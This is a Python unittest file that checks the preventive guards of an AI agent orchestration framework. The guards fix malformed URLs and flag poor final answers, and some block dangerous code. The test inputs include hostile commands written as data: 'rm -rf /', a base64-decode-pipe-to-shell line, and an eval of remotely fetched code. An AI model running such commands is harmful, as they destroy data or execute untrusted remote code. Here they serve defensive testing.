"""Round-49 preventive guard batch — one positive per guard, plus negative
cases ONLY where false-positive risk was a design concern.
"""
from __future__ import annotations

import sys
import unittest
from pathlib import Path

sys.path.insert(0, str(Path(__file__).resolve().parent.parent / "src"))


def _mk(**fields):
    from agentcommander.types import OrchestratorDecision
    return OrchestratorDecision(action=fields.pop("action", "fetch"), **fields)


def _last_nudge(scratchpad) -> str:
    nudges = [e for e in scratchpad if e.action == "system_nudge"]
    return nudges[-1].input if nudges else ""


# ─── Decision-tier ─────────────────────────────────────────────────────────


class TestDecisionTier(unittest.TestCase):
    def test_zero_width_unicode_strips(self) -> None:
        from agentcommander.engine.guards.preventive_guards import zero_width_unicode_guard
        d = _mk(action="fetch", url="https://example.com​/path")  # ZWSP
        zero_width_unicode_guard(d, [], 1)
        self.assertEqual(d.url, "https://example.com/path")

    def test_code_fence_unwrap(self) -> None:
        from agentcommander.engine.guards.preventive_guards import code_fence_in_arg_guard
        d = _mk(action="execute", language="python",
                 input="```python\nprint('hi')\n```")
        code_fence_in_arg_guard(d, [], 1)
        self.assertEqual(d.input, "print('hi')")

    def test_code_fence_skips_non_target_action(self) -> None:
        # FP defense: fences in fetch URL aren't unwrapped.
        from agentcommander.engine.guards.preventive_guards import code_fence_in_arg_guard
        d = _mk(action="fetch", input="```sh\nrm -rf /\n```")
        code_fence_in_arg_guard(d, [], 1)
        self.assertIn("```", d.input)

    def test_markdown_link_extracts_url(self) -> None:
        from agentcommander.engine.guards.preventive_guards import markdown_link_extract_guard
        d = _mk(action="fetch", url="[Google](https://google.com)")
        markdown_link_extract_guard(d, [], 1)
        self.assertEqual(d.url, "https://google.com")

    def test_url_scheme_typo_htttps(self) -> None:
        from agentcommander.engine.guards.preventive_guards import url_scheme_typo_guard
        d = _mk(action="fetch", url="htttps://example.com")
        url_scheme_typo_guard(d, [], 1)
        self.assertEqual(d.url, "https://example.com")

    def test_url_scheme_typo_single_slash(self) -> None:
        from agentcommander.engine.guards.preventive_guards import url_scheme_typo_guard
        d = _mk(action="fetch", url="http:/example.com/page")
        url_scheme_typo_guard(d, [], 1)
        self.assertEqual(d.url, "http://example.com/page")

    def test_protocol_relative_prepends_https(self) -> None:
        from agentcommander.engine.guards.preventive_guards import protocol_relative_url_guard
        d = _mk(action="fetch", url="//cdn.example.com/x.js")
        protocol_relative_url_guard(d, [], 1)
        self.assertEqual(d.url, "https://cdn.example.com/x.js")

    def test_placeholder_url_blocks(self) -> None:
        from agentcommander.engine.guards.preventive_guards import placeholder_url_guard
        scratchpad = []
        d = _mk(action="fetch", url="https://api.example.com?key=YOUR_API_KEY")
        v = placeholder_url_guard(d, scratchpad, 1)
        self.assertEqual(v.action, "continue")
        self.assertEqual(_last_nudge(scratchpad), "placeholder_url")

    def test_empty_role_input_blocks(self) -> None:
        from agentcommander.engine.guards.preventive_guards import empty_role_input_guard
        scratchpad = []
        v = empty_role_input_guard(_mk(action="translator", input="   "),
                                    scratchpad, 1)
        self.assertEqual(v.action, "continue")

    def test_empty_role_input_skips_done(self) -> None:
        # FP defense: done with empty input is allowed (tool-result-only).
        from agentcommander.engine.guards.preventive_guards import empty_role_input_guard
        v = empty_role_input_guard(_mk(action="done", input=""), [], 1)
        self.assertEqual(v.action, "pass")

    def test_tracking_param_strip(self) -> None:
        from agentcommander.engine.guards.preventive_guards import tracking_param_strip_guard
        d = _mk(action="fetch", url="https://x.com/p?id=42&utm_source=email&fbclid=abc")
        tracking_param_strip_guard(d, [], 1)
        self.assertEqual(d.url, "https://x.com/p?id=42")


# ─── Done-tier ─────────────────────────────────────────────────────────────


class TestDoneTier(unittest.TestCase):
    def test_ai_disclaimer_blocks(self) -> None:
        from agentcommander.engine.guards.preventive_guards import ai_disclaimer_guard
        d = _mk(action="done",
                 input="As an AI, I cannot fetch the weather for you.")
        v = ai_disclaimer_guard([], 1, d)
        self.assertEqual(v.action, "continue")

    def test_training_cutoff_leak_blocks(self) -> None:
        from agentcommander.engine.guards.preventive_guards import training_cutoff_leak_guard
        d = _mk(action="done",
                 input="My knowledge cutoff is January 2024 so I can't tell you.")
        v = training_cutoff_leak_guard([], 1, d)
        self.assertEqual(v.action, "continue")

    def test_unfilled_template_blocks(self) -> None:
        from agentcommander.engine.guards.preventive_guards import unfilled_template_guard
        d = _mk(action="done", input="export TOKEN={your-token}")
        v = unfilled_template_guard([], 1, d)
        self.assertEqual(v.action, "continue")

    def test_unfilled_template_passes_clean_text(self) -> None:
        # FP defense — prose with no placeholders.
        from agentcommander.engine.guards.preventive_guards import unfilled_template_guard
        d = _mk(action="done", input="Created the user record successfully.")
        v = unfilled_template_guard([], 1, d)
        self.assertEqual(v.action, "pass")

    def test_fake_citation_blocks_without_fetch(self) -> None:
        from agentcommander.engine.guards.preventive_guards import fake_citation_guard
        d = _mk(action="done",
                 input="Studies [1] show this [2] is well-established [3].")
        v = fake_citation_guard([], 1, d)
        self.assertEqual(v.action, "continue")

    def test_fake_citation_passes_when_fetch_happened(self) -> None:
        # Critical context-aware logic: fetch in scratchpad → citations OK.
        import time
        from agentcommander.engine.guards.preventive_guards import fake_citation_guard
        from agentcommander.types import ScratchpadEntry
        scratchpad = [ScratchpadEntry(
            step=1, role="tool", action="fetch", input="https://x.com",
            output="Successfully fetched 1234 bytes", timestamp=time.time(),
        )]
        d = _mk(action="done", input="Studies [1] show this [2] [3].")
        v = fake_citation_guard(scratchpad, 1, d)
        self.assertEqual(v.action, "pass")

    def test_stale_year_blocks(self) -> None:
        import datetime as dt
        from agentcommander.engine.guards.preventive_guards import stale_year_guard
        old = dt.datetime.now().year - 3
        d = _mk(action="done", input=f"As of {old}, the population was 3 million.")
        v = stale_year_guard([], 1, d)
        self.assertEqual(v.action, "continue")

    def test_stale_year_passes_birth_year_phrasing(self) -> None:
        # FP defense: pre-2000 years are usually birth-years, not stale-cutoffs.
        from agentcommander.engine.guards.preventive_guards import stale_year_guard
        d = _mk(action="done", input="They were born in 1985.")
        v = stale_year_guard([], 1, d)
        self.assertEqual(v.action, "pass")

    def test_hedge_only_blocks(self) -> None:
        from agentcommander.engine.guards.preventive_guards import hedge_only_guard
        d = _mk(action="done",
                 input="It depends on the situation. Without more information, "
                       "it's hard to say.")
        v = hedge_only_guard([], 1, d)
        self.assertEqual(v.action, "continue")

    def test_hedge_with_numbers_passes(self) -> None:
        # FP defense: hedged answer with concrete numbers is real content.
        from agentcommander.engine.guards.preventive_guards import hedge_only_guard
        d = _mk(action="done",
                 input="It depends on usage, but typically 100-500 requests/sec.")
        v = hedge_only_guard([], 1, d)
        self.assertEqual(v.action, "pass")

    def test_unclosed_codefence_appends(self) -> None:
        from agentcommander.engine.guards.preventive_guards import unclosed_codefence_guard
        d = _mk(action="done", input="Here:\n```python\nprint('hi')")
        unclosed_codefence_guard([], 1, d)
        self.assertTrue(d.input.endswith("```"))

    def test_over_apologetic_blocks(self) -> None:
        from agentcommander.engine.guards.preventive_guards import over_apologetic_guard
        d = _mk(action="done",
                 input="I'm sorry. I apologize for the confusion. My apologies again.")
        v = over_apologetic_guard([], 1, d)
        self.assertEqual(v.action, "continue")

    def test_dangling_promise_blocks(self) -> None:
        from agentcommander.engine.guards.preventive_guards import dangling_promise_guard
        d = _mk(action="done", input="Let me research that and get back to you.")
        v = dangling_promise_guard([], 1, d)
        self.assertEqual(v.action, "continue")


# ─── Execute-tier ──────────────────────────────────────────────────────────


class TestExecuteTier(unittest.TestCase):
    def test_base64_pipe_shell_blocks(self) -> None:
        from agentcommander.engine.guards.preventive_guards import base64_pipe_shell_guard
        _, v = base64_pipe_shell_guard("echo SGVsbG8= | base64 -d | sh", [], 1)
        self.assertEqual(v.action, "continue")

    def test_homoglyph_blocks_in_identifier(self) -> None:
        # Cyrillic 'а'/'с' in identifier positions.
        from agentcommander.engine.guards.preventive_guards import homoglyph_guard
        code = "def myfunc():\n    return 1\nmyfunс()"
        _, v = homoglyph_guard(code, [], 1)
        self.assertEqual(v.action, "continue")

    def test_homoglyph_passes_string_literal(self) -> None:
        # Critical FP defense: Cyrillic inside string content is fine.
        from agentcommander.engine.guards.preventive_guards import homoglyph_guard
        code = 'msg = "Привет, мир"\nprint(msg)'
        _, v = homoglyph_guard(code, [], 1)
        self.assertEqual(v.action, "pass")

    def test_shell_history_subst_strips(self) -> None:
        from agentcommander.engine.guards.preventive_guards import shell_history_subst_guard
        new_code, v = shell_history_subst_guard("ls\n!! | wc -l", [], 1)
        self.assertEqual(v.action, "pass")
        self.assertNotIn("!!", new_code)

    def test_eval_remote_string_blocks(self) -> None:
        from agentcommander.engine.guards.preventive_guards import eval_remote_string_guard
        code = "import requests\neval(requests.get('https://x.com').text)"
        _, v = eval_remote_string_guard(code, [], 1)
        self.assertEqual(v.action, "continue")


if __name__ == "__main__":
    unittest.main()
